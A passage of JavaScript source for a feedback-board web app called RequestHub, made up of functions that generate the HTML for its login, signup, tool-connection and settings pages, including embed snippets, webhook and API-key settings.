        <p>A public roadmap view grouped by status - Under Review, Planned, In Progress, Shipped - so customers always know what's next.</p>
      </div>
      <div class="feature-card">
        <div class="feature-icon"><svg viewBox="0 0 24 24"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg></div>
        <h3>Triage dashboard</h3>
        <p>Every idea in one filterable view - search, filter by status or category, and move things forward with one click.</p>
      </div>
      <div class="feature-card">
        <div class="feature-icon"><svg viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.5.5l2-2a5 5 0 0 0-7-7l-1.5 1.5"/><path d="M14 11a5 5 0 0 0-7.5-.5l-2 2a5 5 0 0 0 7 7l1.5-1.5"/></svg></div>
        <h3>Connect your own tools</h3>
        <p>Wire up your own Slack, Linear, and Notion. Moving an idea to Planned creates a real ticket; Shipped archives it and announces it.</p>
      </div>
      <div class="feature-card">
        <div class="feature-icon"><svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg></div>
        <h3>Embed anywhere</h3>
        <p>One script tag adds a floating feedback button to your own site - no iframe, no CORS setup, works from any domain.</p>
      </div>
      <div class="feature-card">
        <div class="feature-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
        <h3>Set up in minutes</h3>
        <p>Pick a name, get a real board instantly. Connect your tools and add the embed snippet whenever you're ready.</p>
      </div>
    </div>
  </div>

  <div class="section" id="pricing">
    <div class="section-label">Pricing</div>
    <div class="section-title">Simple, transparent pricing</div>
    <div class="plans">${pricingCards}</div>
  </div>

  <div class="cta-band">
    <h2>Ready to hear from your customers?</h2>
    <p>Set up your own board in under a minute - no credit card required.</p>
    <a class="btn-primary" href="/signup">Start your board &rarr;</a>
  </div>

  <div class="footer">Powered by RequestHub, built on Fastn</div>
</body>
</html>`;
}

function loginLookupPage(errorMsg) {
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Log in - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    body { display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .card { width: 100%; max-width: 360px; padding: 32px; background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); box-sizing: border-box; }
    .logo-mark { width: 32px; height: 32px; border-radius: 9px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 15px; margin-bottom: 14px; }
    h1 { font-size: 19px; margin: 0 0 6px; color: var(--text); }
    p { color: var(--text-muted); font-size: 13px; margin: 0 0 18px; line-height: 1.5; }
    input { width: 100%; background: var(--surface-2); border: 1px solid var(--border); color: var(--text); border-radius: 8px; padding: 10px 12px; font-size: 14px; box-sizing: border-box; margin-bottom: 12px; font-family: inherit; }
    button { width: 100%; background: var(--accent); color: #fff; border: none; padding: 11px; border-radius: var(--radius-btn); font-size: 14px; font-weight: 600; cursor: pointer; font-family: inherit; }
    button:hover { background: var(--accent-hover); }
    .error { color: var(--bad); font-size: 12.5px; margin: -4px 0 12px; }
    .back { display: block; text-align: center; margin-top: 16px; color: var(--text-muted); font-size: 12.5px; text-decoration: none; }
    .back:hover { color: var(--text); }
  </style>
</head>
<body>
  <div class="card">
    <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode" style="position:fixed;top:16px;right:16px;"></button>
    <div class="logo-mark">R</div>
    <h1>Log in to your board</h1>
    <p>Enter your board's name to go to its admin login.</p>
    ${errorMsg ? `<div class="error">${escapeHtml(errorMsg)}</div>` : ""}
    <form id="form">
      <input id="slug" required placeholder="e.g. acme-saas" aria-label="Board name" autofocus />
      <button type="submit">Continue</button>
    </form>
    <a class="back" href="/">&larr; Back home</a>
  </div>
  <script>
    document.getElementById('form').addEventListener('submit', function (e) {
      e.preventDefault();
      var slug = document.getElementById('slug').value.trim().toLowerCase().replace(/[^a-z0-9-]/g, '');
      if (!slug) return;
      window.location.href = '/b/' + encodeURIComponent(slug) + '/admin';
    });
  </script>
</body>
</html>`;
}

function signupPage(errorMsg) {
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Start your board - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    body { display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .card { width: 100%; max-width: 400px; padding: 32px; background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); box-sizing: border-box; }
    .logo-mark { width: 32px; height: 32px; border-radius: 9px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 15px; margin-bottom: 14px; }
    h1 { font-size: 19px; margin: 0 0 6px; color: var(--text); }
    p { color: var(--text-muted); font-size: 13px; margin: 0 0 18px; line-height: 1.5; }
    label { display: block; font-size: 11.5px; font-weight: 600; text-transform: uppercase; letter-spacing: .03em; color: var(--text-faint); margin-bottom: 5px; }
    input {
      width: 100%; background: var(--surface-2); border: 1px solid var(--border); color: var(--text); border-radius: 8px;
      padding: 10px 12px; font-size: 14px; box-sizing: border-box; margin-bottom: 4px; font-family: inherit;
    }
    .hint { color: var(--text-faint); font-size: 11.5px; margin: 0 0 16px; }
    .hint b { color: var(--text-muted); }
    button { width: 100%; background: var(--accent); color: #fff; border: none; padding: 11px; border-radius: var(--radius-btn); font-size: 14px; font-weight: 600; cursor: pointer; font-family: inherit; }
    button:hover { background: var(--accent-hover); }
    button:disabled { background: var(--surface-3); color: var(--text-faint); cursor: default; }
    .error { color: var(--bad); font-size: 12.5px; margin: -4px 0 12px; }
    .back { display: block; text-align: center; margin-top: 16px; color: var(--text-muted); font-size: 12.5px; text-decoration: none; }
    .back:hover { color: var(--text); }
  </style>
</head>
<body>
  <div class="card">
    <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode" style="position:fixed;top:16px;right:16px;"></button>
    <div class="logo-mark">R</div>
    <h1>Start your own feedback board</h1>
    <p>Enter your company name and we'll set up a real board, with your own Slack, Linear, and Notion connections - no login, no credit card.</p>
    ${errorMsg ? `<div class="error">${escapeHtml(errorMsg)}</div>` : ""}
    <form id="form">
      <label for="name">Company name</label>
      <input id="name" required maxlength="60" placeholder="e.g. Acme SaaS" autofocus />
      <div class="hint" id="hint">Your board will be at requesthub.zohaib-iot.workers.dev/b/<b id="slugPreview">your-slug</b></div>
      <button type="submit" id="submitBtn">Create my board</button>
    </form>
    <a class="back" href="/">&larr; Back</a>
  </div>
  <script>
    var nameInput = document.getElementById('name');
    var slugPreview = document.getElementById('slugPreview');
    function slugify(s) {
      return s.toLowerCase().trim().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '').slice(0, 48);
    }
    nameInput.addEventListener('input', function () {
      slugPreview.textContent = slugify(nameInput.value) || 'your-slug';
    });
    document.getElementById('form').addEventListener('submit', function (e) {
      e.preventDefault();
      var btn = document.getElementById('submitBtn');
      btn.disabled = true;
      btn.textContent = 'Creating your board...';
      fetch('/api/signup', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ name: nameInput.value.trim() }),
      })
        .then(function (r) { return r.json(); })
        .then(function (d) {
          if (d.ok) {
            window.location.href = '/signup/done?slug=' + encodeURIComponent(d.slug);
          } else {
            window.location.href = '/signup?error=' + encodeURIComponent(d.error || 'Could not create your board');
          }
        })
        .catch(function () {
          window.location.href = '/signup?error=' + encodeURIComponent('Something went wrong - try again');
        });
    });
  </script>
</body>
</html>`;
}

function signupDonePage(customerSlug, baseUrl) {
  const base = baseUrl || "https://requesthub.zohaib-iot.workers.dev";
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>You're set up - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    .page { max-width: 560px; margin: 0 auto; padding: 48px 24px; }
    .logo-mark { width: 32px; height: 32px; border-radius: 9px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 15px; margin-bottom: 18px; }
    h1 { font-size: 21px; margin: 0 0 6px; color: var(--text); }
    p { color: var(--text-muted); font-size: 13.5px; line-height: 1.6; margin: 0 0 24px; }
    .step { background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); padding: 16px 18px; margin-bottom: 12px; }
    .step-num { display: inline-flex; width: 22px; height: 22px; border-radius: 50%; background: var(--accent); color: #fff; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; margin-right: 8px; }
    .step h3 { display: inline; font-size: 14px; margin: 0; color: var(--text); }
    .step p { margin: 8px 0 10px 30px; color: var(--text-muted); font-size: 13px; }
    a.btn { display: inline-block; margin-left: 30px; background: var(--accent); color: #fff; text-decoration: none; font-size: 13px; font-weight: 600; padding: 8px 14px; border-radius: var(--radius-btn); }
    a.btn:hover { background: var(--accent-hover); }
    code { background: var(--surface-2); border: 1px solid var(--border); border-radius: 6px; padding: 8px 10px; font-size: 12px; display: block; margin: 8px 0 0 30px; overflow-x: auto; white-space: pre; color: var(--accent-hover); }
  </style>
</head>
<body>
  <div class="page">
    <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode" style="position:fixed;top:16px;right:16px;"></button>
    <div class="logo-mark">R</div>
    <h1>Your board is live</h1>
    <p>Your real feedback board exists now at <b>/b/${escapeHtml(customerSlug)}</b>. Three steps left, all yours to do:</p>

    <div class="step">
      <span class="step-num">1</span><h3>Set your admin password</h3>
      <p>No login exists yet for your board - the first visit lets you choose one.</p>
      <a class="btn" href="/b/${encodeURIComponent(customerSlug)}/admin">Set password &rarr;</a>
    </div>

    <div class="step">
      <span class="step-num">2</span><h3>Connect your own tools</h3>
      <p>Wire up your own Slack, Linear, and/or Notion so submissions and status updates flow into your workspace.</p>
      <a class="btn" href="/b/${encodeURIComponent(customerSlug)}/connect">Connect tools &rarr;</a>
    </div>

    <div class="step">
      <span class="step-num">3</span><h3>Add it to your own site</h3>
      <p>Drop this one line into your site to get a floating feedback button:</p>
      <code>&lt;script src="${base}/embed.js" data-customer="${escapeHtml(customerSlug)}"&gt;&lt;/script&gt;</code>
    </div>
  </div>
</body>
</html>`;
}

function connectPage(customerSlug, endOrgId, token, setupLinks, isOwner) {
  const cards = CONNECT_WIDGETS.map(function (w) {
    const link = setupLinks[w.slug];
    const initial = w.name.charAt(0);
    return `<div class="tool-card">
      <div class="tool-icon" style="background:${w.color}">${initial}</div>
      <div class="tool-info">
        <div class="tool-name">${w.name}</div>
        <div class="tool-sub">Connect your own ${w.name} workspace</div>
      </div>
      ${
        link
          ? `<a class="btn-connect" href="${link}" target="_blank" rel="noopener">Connect &#8599;</a>`
          : `<span class="btn-connect disabled">Unavailable</span>`
      }
    </div>`;
  }).join("");

  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Connect your tools - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    .topbar { background: var(--card); border-bottom: 1px solid var(--border); padding: 14px 24px; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
    .logo-mark { width: 28px; height: 28px; border-radius: 8px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; }
    .brand { font-weight: 700; font-size: 15px; }
    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 18px; }
    .nav-right a { color: var(--text-muted); font-size: 13px; text-decoration: none; }
    .nav-right a:hover { color: var(--text); }
    .nav-right a.logout { color: var(--bad); }
    .nav-right a.owner-link { color: var(--accent); font-weight: 600; }
    .page { max-width: 760px; margin: 0 auto; padding: 24px; }
    .hero { margin-bottom: 20px; }
    .hero h1 { font-size: 19px; margin: 0 0 4px; }
    .hero p { margin: 0; color: var(--text-muted); font-size: 13.5px; }

    .tool-card {
      display: flex; align-items: center; gap: 14px; background: var(--card); border: 1px solid var(--border);
      border-radius: var(--radius-card); padding: 14px 16px; margin-bottom: 10px;
    }
    .tool-icon {
      width: 36px; height: 36px; border-radius: 9px; color: #fff; font-weight: 700; font-size: 15px;
      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
    }
    .tool-info { flex: 1; min-width: 0; }
    .tool-name { font-weight: 600; font-size: 14px; color: var(--text); }
    .tool-sub { color: var(--text-muted); font-size: 12.5px; margin-top: 2px; }
    .btn-connect {
      flex-shrink: 0; background: var(--accent); color: #fff; text-decoration: none; font-size: 13px;
      font-weight: 600; padding: 8px 14px; border-radius: var(--radius-btn);
    }
    .btn-connect:hover { background: var(--accent-hover); }
    .btn-connect.disabled { background: var(--surface-3); color: var(--text-faint); cursor: default; }

    .section-label {
      font-size: 11.5px; font-weight: 600; text-transform: uppercase; letter-spacing: .04em;
      color: var(--text-faint); margin: 28px 0 10px;
    }
    .frame-wrap { border: 1px solid var(--border); border-radius: var(--radius-card); overflow: hidden; min-height: 500px; background: var(--card); }
    .frame-wrap iframe { display: block; width: 100%; height: 500px; border: none; }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo-mark">R</div>
    <div class="brand">RequestHub</div>
    <nav class="nav-right">
      ${isOwner ? `<a class="owner-link" href="/owner">&larr; Owner console</a>` : ""}
      <a href="/b/${encodeURIComponent(customerSlug)}">&larr; Back to board</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/settings">Settings</a>
      <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode"></button>
      <a class="logout" href="/b/${encodeURIComponent(customerSlug)}/logout">Log out</a>
    </nav>
  </div>
  <div class="page">
    <div class="hero">
      <h1>Connect your tools</h1>
      <p>Connect your own Slack, Linear, and Notion so submissions, status updates, and your changelog flow into your own workspace - without leaving RequestHub.</p>
    </div>

    ${cards}

    <div class="section-label">Connection status</div>
    <div class="frame-wrap">
      <iframe id="connectFrame" src="${FASTN_BASE}/api/v1/embed/iframe?token=${encodeURIComponent(token)}&org-id=${encodeURIComponent(endOrgId)}&theme=light" allow="clipboard-write"></iframe>
    </div>
  </div>
  <script>
    document.addEventListener('DOMContentLoaded', function () {
      // THEME_TOGGLE_SCRIPT (in <head>) already applied the right data-theme
      // attribute by this point - this iframe is a separate origin and can't
      // read our CSS variables, so it needs its own theme param kept in sync,
      // both on load and whenever the toggle flips.
      var iframe = document.getElementById('connectFrame');
      var toggle = document.getElementById('themeToggle');
      function isDarkNow() {
        var attr = document.documentElement.getAttribute('data-theme');
        return attr === 'dark' || (!attr && window.matchMedia('(prefers-color-scheme: dark)').matches);
      }
      function syncFrameTheme() {
        try {
          var u = new URL(iframe.src);
          u.searchParams.set('theme', isDarkNow() ? 'dark' : 'light');
          if (iframe.src !== u.toString()) iframe.src = u.toString();
        } catch {}
      }
      syncFrameTheme();
      if (toggle) toggle.addEventListener('click', function () { setTimeout(syncFrameTheme, 0); });
    });
  </script>
</body>
</html>`;
}

function settingsPage(customerSlug, settings, saved, isOwner, baseUrl) {
  const embedSnippet = `<script src="${baseUrl}/embed.js" data-customer="${customerSlug}"><\/script>`;
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Settings - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    .topbar { background: var(--card); border-bottom: 1px solid var(--border); padding: 14px 24px; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
    .logo-mark { width: 28px; height: 28px; border-radius: 8px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; }
    .brand { font-weight: 700; font-size: 15px; }
    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 18px; }
    .nav-right a { color: var(--text-muted); font-size: 13px; text-decoration: none; }
    .nav-right a:hover { color: var(--text); }
    .nav-right a.logout { color: var(--bad); }
    .nav-right a.owner-link { color: var(--accent); font-weight: 600; }
    .page { max-width: 640px; margin: 0 auto; padding: 24px; }
    .hero { margin-bottom: 20px; }
    .hero h1 { font-size: 19px; margin: 0 0 4px; }
    .hero p { margin: 0; color: var(--text-muted); font-size: 13.5px; }

    .card { background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); padding: 18px 20px; margin-bottom: 14px; }
    .card h2 { font-size: 14px; margin: 0 0 3px; }
    .card .hint { color: var(--text-muted); font-size: 12.5px; margin: 0 0 12px; line-height: 1.5; }
    .field { margin-bottom: 12px; }
    .field label { display: block; font-size: 12.5px; font-weight: 600; color: var(--text-muted); margin-bottom: 5px; }
    .field input {
      width: 100%; background: var(--surface-2); border: 1px solid var(--border); color: var(--text);
      border-radius: 8px; padding: 9px 11px; font-size: 13.5px; font-family: inherit; box-sizing: border-box;
    }
    .field select {
      width: 100%; background: var(--surface-2); border: 1px solid var(--border); color: var(--text);
      border-radius: 8px; padding: 9px 11px; font-size: 13.5px; font-family: inherit; box-sizing: border-box;
      margin-bottom: 6px; cursor: pointer;
    }
    .field select:disabled { color: var(--text-faint); cursor: default; }
    .field label.checkbox-label { display: flex; align-items: center; gap: 6px; }
    .field label.checkbox-label input[type="checkbox"] { width: auto; }
    .field .select-note { font-size: 11.5px; color: var(--text-faint); margin: 0 0 6px; }
    .btn-submit {
      background: var(--accent); color: #fff; border: none; padding: 10px 18px; border-radius: var(--radius-btn);
      font-size: 13.5px; font-weight: 600; cursor: pointer; font-family: inherit;
    }
    .btn-submit:hover { background: var(--accent-hover); }
    .saved-note { color: var(--good); font-size: 13px; font-weight: 600; margin-bottom: 14px; }
    .embed-code { display: flex; align-items: center; gap: 8px; background: var(--surface-2); border: 1px solid var(--border); border-radius: 8px; padding: 10px 11px; }
    .embed-code code { flex: 1; min-width: 0; font-size: 12.5px; color: var(--accent-hover); overflow-x: auto; white-space: pre; }
    .btn-copy {
      flex-shrink: 0; background: var(--surface-3); color: var(--text); border: none; padding: 7px 12px; border-radius: var(--radius-btn);
      font-size: 12.5px; font-weight: 600; cursor: pointer; font-family: inherit;
    }
    .btn-copy:hover { background: var(--border); }
    .btn-copy.copied { background: var(--good-tint); color: var(--good); }
    .team-row { display: flex; align-items: center; justify-content: space-between; padding: 9px 0; border-bottom: 1px solid var(--border); font-size: 13px; }
    .team-row:last-child { border-bottom: none; }
    .team-row .btn-remove { background: none; border: none; color: var(--bad); font-size: 12px; font-weight: 600; cursor: pointer; font-family: inherit; }
    .team-row .btn-remove:hover { text-decoration: underline; }
    .team-empty { color: var(--text-faint); font-size: 12.5px; padding: 4px 0 10px; }
    .team-invite-row { display: flex; gap: 8px; margin-top: 10px; }
    .team-invite-row input {
      flex: 1; background: var(--surface-2); border: 1px solid var(--border); color: var(--text);
      border-radius: 8px; padding: 9px 11px; font-size: 13px; font-family: inherit;
    }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo-mark">R</div>
    <div class="brand">RequestHub</div>
    <nav class="nav-right">
      ${isOwner ? `<a class="owner-link" href="/owner">&larr; Owner console</a>` : ""}
      <a href="/b/${encodeURIComponent(customerSlug)}/admin">&larr; Back to triage</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/analytics">Analytics</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/settings">Settings</a>
      <a href="/b/${encodeURIComponent(customerSlug)}/billing">Billing</a>
      <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode"></button>
      <a class="logout" href="/b/${encodeURIComponent(customerSlug)}/logout">Log out</a>
    </nav>
  </div>
  <div class="page">
    <div class="hero">
      <h1>Notification settings</h1>
      <p>Choose exactly where submissions and status updates land in your own Slack, Linear, and Notion - once you've connected them on the <a href="/b/${encodeURIComponent(customerSlug)}/connect">Connect your tools</a> page.</p>
    </div>

    ${saved ? `<div class="saved-note">Settings saved.</div>` : ""}

    <form method="POST" action="/api/customers/${encodeURIComponent(customerSlug)}/settings" id="settingsForm">
      <div class="card">
        <h2>Slack</h2>
        <p class="hint">The channel new submissions get posted to. Pick one from your workspace below, or leave blank to use your workspace's default channel.</p>
        <div class="field">
          <select id="slackChannelPicker" disabled><option>Loading your Slack channels...</option></select>
          <p class="select-note" id="slackChannelNote"></p>
          <label for="slackChannel">Channel name</label>
          <input id="slackChannel" name="slackChannel" placeholder="#feedback" value="${escapeHtml(settings.slackChannel || "")}" />
        </div>
      </div>

      <div class="card">
        <h2>Linear</h2>
        <p class="hint">The team that tickets get created in when you mark an idea "Planned" or "In Progress". Pick one from your workspace below, or paste a Team ID directly.</p>
        <div class="field">
          <select id="linearTeamPicker" disabled><option>Loading your Linear teams...</option></select>
          <p class="select-note" id="linearTeamNote"></p>
          <label for="linearTeamId">Team ID</label>
          <input id="linearTeamId" name="linearTeamId" placeholder="e.g. 6a0351f8-9f72-49b7-a11a-753726597688" value="${escapeHtml(settings.linearTeamId || "")}" />
        </div>
      </div>

      <div class="card">
        <h2>Notion</h2>
        <p class="hint">The changelog database in Notion - each shipped idea becomes its own row (title, category, description), not a line appended to a page. Pick one from your workspace below, or paste a Database ID directly.</p>
        <div class="field">
          <select id="notionPagePicker" disabled><option>Loading your Notion databases...</option></select>
          <p class="select-note" id="notionPageNote"></p>
          <label for="notionPageId">Database ID</label>
          <input id="notionPageId" name="notionPageId" placeholder="e.g. 40aa930e131b81aba587c6ee135c8c82" value="${escapeHtml(settings.notionPageId || "")}" />
        </div>
      </div>

      <div class="card">
        <h2>Pipeline status names</h2>
        <p class="hint">Call your stages whatever makes sense for your team. For the three that have a matching Linear ticket state, pick exactly which state - your internal team can keep other states in between (code review, QA, etc.) that stay invisible to this board. "Declined" is a terminal status for won't-fix/duplicate items and maps to Linear's "Canceled" type automatically - no picker needed.</p>
        ${["under_review", "planned", "in_progress", "shipped", "declined"]
          .map((key) => {
            const defaultLabel = DEFAULT_STATUS_LABELS[key];
            const currentLabel = settings.statusLabels?.[key] || defaultLabel;
            const needsLinear = key === "planned" || key === "in_progress" || key === "shipped";
            const isHidden = (settings.hiddenRoadmapStatuses || []).includes(key);
            return `<div class="field">
          <label for="statusLabel_${key}">${defaultLabel}</label>
          <input id="statusLabel_${key}" name="statusLabel_${key}" value="${escapeHtml(currentLabel)}" placeholder="${defaultLabel}" />
          <label class="checkbox-label" style="font-weight:400;margin-top:6px;">
            <input type="checkbox" name="hideFromRoadmap_${key}" ${isHidden ? "checked" : ""} />
            Hide "${defaultLabel}" from the public roadmap
          </label>
          ${needsLinear
            ? `<label for="linearState_${key}" style="margin-top:6px;">Linear state</label>
          <select id="linearState_${key}" name="linearStateId_${key}" data-current="${escapeHtml(settings.linearStateIds?.[key] || "")}" disabled><option>${settings.linearTeamId ? "Loading Linear states..." : "Connect a Linear team above first"}</option></select>
          <p class="select-note" id="linearStateNote_${key}"></p>`
            : ""}
        </div>`;
          })
          .join("")}
      </div>

      <div class="card">
        <h2>Categories</h2>
        <p class="hint">What kind of feedback can customers submit? Comma-separated - rename, add, or remove to match your team's vocabulary (e.g. "Integration request", "Mobile"). Defaults to Feature, Bug, Feedback.</p>
        <div class="field">
          <input name="categories" value="${escapeHtml((settings.categories || ["Feature", "Bug", "Feedback"]).join(", "))}" placeholder="Feature, Bug, Feedback" aria-label="Categories" />
        </div>
      </div>

      <div class="card">
        <h2>Automation</h2>
        <p class="hint">Auto-promote an idea from "Under Review" straight to "Planned" - same as doing it by hand (Linear ticket, webhooks, everything) - once it reaches this many votes. Leave blank to turn off; off by default.</p>
        <div class="field">
          <label for="autoPromoteVoteThreshold">Auto-promote at N votes</label>
          <input id="autoPromoteVoteThreshold" type="number" min="1" step="1" name="autoPromoteVoteThreshold" value="${settings.autoPromoteVoteThreshold ? escapeHtml(String(settings.autoPromoteVoteThreshold)) : ""}" placeholder="disabled" />
        </div>
      </div>

      <button type="submit" class="btn-submit" id="settingsSaveBtn">Save settings</button>
      <span id="settingsSaveNote" class="hint" style="margin-left: 10px;"></span>
    </form>

    <div class="card">
      <h2>Real-time sync with Linear</h2>
      ${settings.linearTeamId
        ? `<p class="hint">Status stays in sync both ways - change it in Linear and it updates the idea here, change it here (Planned, In Progress, Shipped) and it moves the matching Linear ticket, including moving it backward.</p>
      <p class="hint" id="linearSyncStatus">${settings.linearWebhookEnabled
        ? `<strong style="color: var(--good);">On</strong> - watching your "${escapeHtml(settings.linearTeamId)}" team for status changes.`
        : `<strong style="color: var(--text-faint);">Off</strong>.`}</p>
      <button type="button" class="btn-submit" id="linearSyncToggleBtn" style="${settings.linearWebhookEnabled ? "background: var(--bad);" : ""}">${settings.linearWebhookEnabled ? "Turn off" : "Turn on"}</button>`
        : `<p class="hint">Connect a Linear team above and save, then come back here to turn on real-time sync.</p>`}
    </div>

    <div class="card">
      <h2>Embed on your own site</h2>
      <p class="hint">Add this one line to your website to get a floating feedback button. It works on any domain - no CORS setup, no account, nothing else to configure. Submissions land straight on your board above.</p>
      <div class="embed-code">
        <code id="embedSnippet">${escapeHtml(embedSnippet)}</code>
        <button type="button" class="btn-copy" id="copyEmbedBtn">Copy</button>
      </div>
      <p class="hint" style="margin-top: 10px;">Optional: add <code style="background:none;border:none;padding:0;display:inline;">data-color="#ff6600"</code> to match your brand, and <code style="background:none;border:none;padding:0;display:inline;">data-position="bottom-left"</code> / <code style="background:none;border:none;padding:0;display:inline;">"top-left"</code> / <code style="background:none;border:none;padding:0;display:inline;">"top-right"</code> to move it (defaults to bottom-right, current purple). Already have your own feedback button somewhere on your site? Add <code style="background:none;border:none;padding:0;display:inline;">data-target="#your-button-id"</code> and that button opens the panel directly - no floating bubble at all.</p>
    </div>

    <div class="card">
      <h2>Embed your changelog</h2>
      <p class="hint">A small "What's new" badge for your site - shows a red dot when there's something new, and opens a popover listing your last 5 shipped items, each linking back to your full changelog.</p>
      <div class="embed-code">
        <code id="changelogEmbedSnippet">${escapeHtml(`<script src="${baseUrl}/changelog-embed.js" data-customer="${customerSlug}"><\/script>`)}</code>
        <button type="button" class="btn-copy" id="copyChangelogEmbedBtn">Copy</button>
      </div>
      <p class="hint" style="margin-top: 10px;">Same <code style="background:none;border:none;padding:0;display:inline;">data-color</code> / <code style="background:none;border:none;padding:0;display:inline;">data-position</code> options as the feedback widget above (defaults to bottom-left so the two don't collide if you embed both).</p>
    </div>

    <div class="card">
      <h2>API access</h2>
      <p class="hint">Call RequestHub from your own backend instead of (or alongside) the embed widget - list ideas, create one, or update a status. One active key per board; generating a new one revokes the old.</p>
      <div id="apiKeyStatus"><p class="hint">Loading...</p></div>
      <p class="hint" style="margin-top: 10px;"><code style="background:none;border:none;padding:0;display:inline;">GET/POST ${escapeHtml(baseUrl)}/api/v1/ideas</code>, <code style="background:none;border:none;padding:0;display:inline;">GET ${escapeHtml(baseUrl)}/api/v1/ideas/:id</code>, <code style="background:none;border:none;padding:0;display:inline;">POST ${escapeHtml(baseUrl)}/api/v1/ideas/:id/status</code> - send your key as <code style="background:none;border:none;padding:0;display:inline;">Authorization: Bearer rhk_...</code>.</p>
    </div>

    <div class="card">
      <h2>Team</h2>
      <p class="hint">Invite teammates to sign in with their own email instead of sharing the admin password. Anyone invited gets full admin access, same as the shared password.</p>
      <div id="teamList"></div>
      <div class="team-invite-row">
        <input type="email" id="inviteEmail" placeholder="teammate@company.com" aria-label="Teammate's email address" />
        <button type="button" class="btn-copy" id="inviteBtn">Invite</button>
      </div>
      <p class="hint" id="inviteNote" style="margin-top: 8px;"></p>
    </div>

    <div class="card">
      <h2>Webhooks</h2>
      <p class="hint">Notify your own systems when an idea is submitted, its status changes, or someone comments. Each delivery is a signed POST - verify it with HMAC-SHA256 over the raw body using the secret shown when you create it (shown once, not stored anywhere you can retrieve again).</p>
      <div id="webhookList"></div>
      <div class="field" style="margin-top: 14px;">
        <label>Events to send</label>
        <label class="checkbox-label"><input type="checkbox" id="webhookEventCreated" checked /> Idea submitted (idea.created)</label>
        <label class="checkbox-label"><input type="checkbox" id="webhookEventStatus" checked /> Status changed (idea.status_changed)</label>
        <label class="checkbox-label"><input type="checkbox" id="webhookEventComment" checked /> Comment posted (comment.created)</label>
        <label class="checkbox-label"><input type="checkbox" id="webhookEventMerged" checked /> Idea merged into another (idea.merged)</label>
      </div>
      <div class="team-invite-row">
        <input type="url" id="webhookUrl" placeholder="https://your-system.example.com/webhooks/requesthub" aria-label="Webhook URL" />
        <button type="button" class="btn-copy" id="addWebhookBtn">Add</button>
      </div>
      <p class="hint" id="webhookNote" style="margin-top: 8px;"></p>
    </div>
  </div>
  <script>
    var customerSlug = ${JSON.stringify(customerSlug)};

    (function () {
      var form = document.getElementById('settingsForm');
      var btn = document.getElementById('settingsSaveBtn');
      var note = document.getElementById('settingsSaveNote');

      function submitSettings() {
        var formData = new FormData(form);
        var statusLabels = {};
        var linearStateIds = {};
        var hiddenRoadmapStatuses = [];
        formData.forEach(function (value, key) {
          if (key.indexOf('statusLabel_') === 0) statusLabels[key.slice('statusLabel_'.length)] = value;
          if (key.indexOf('linearStateId_') === 0) linearStateIds[key.slice('linearStateId_'.length)] = value;
          if (key.indexOf('hideFromRoadmap_') === 0) hiddenRoadmapStatuses.push(key.slice('hideFromRoadmap_'.length));
        });
        var categoriesRaw = formData.get('categories') || '';
        var categories = categoriesRaw.split(',').map(function (c) { return c.trim(); }).filter(Boolean);
        var body = {
          slackChannel: formData.get('slackChannel') || '',
          linearTeamId: formData.get('linearTeamId') || '',
          notionPageId: formData.get('notionPageId') || '',
